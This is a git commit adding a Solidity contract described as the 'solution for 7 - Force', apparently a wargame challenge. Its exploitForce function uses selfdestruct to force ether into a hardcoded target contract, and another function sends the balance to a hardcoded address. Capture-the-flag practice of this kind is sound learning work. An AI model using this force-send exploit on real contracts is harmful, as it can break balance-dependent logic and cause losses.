dbc4b3fe43ad995da85bd71783b82361a392aba9
alternativeFlow <danxue@gmail.com>
2019-01-08 08:10:21 -0800

    solution for 7 - Force

---
+++ 7force/ForceForce.sol
@@ -0,0 +1,32 @@
+pragma solidity ^0.4.18;
+
+contract Force {/*
+
+                   MEOW ?
+         /\_/\   /
+    ____/ o o \
+  /~____  =ø= /
+ (______)__m_m)
+
+*/}
+
+contract ForceForce {
+    
+    function ForceForce() public {
+    }
+    
+    function giveMeTheGoods() public payable {
+        address myAddress = 0x7B69Cf3D6A03C3cA6Ac5B9a620b6a07981c5E56F;
+        myAddress.transfer(this.balance);
+    }
+    
+    function() external payable {
+        
+    }
+    
+    function exploitForce() {
+        address forceContract = 0x156eEc565A763C168135C7350E9095b32B4669Ca;
+        selfdestruct(forceContract);
+    }
+    
+}
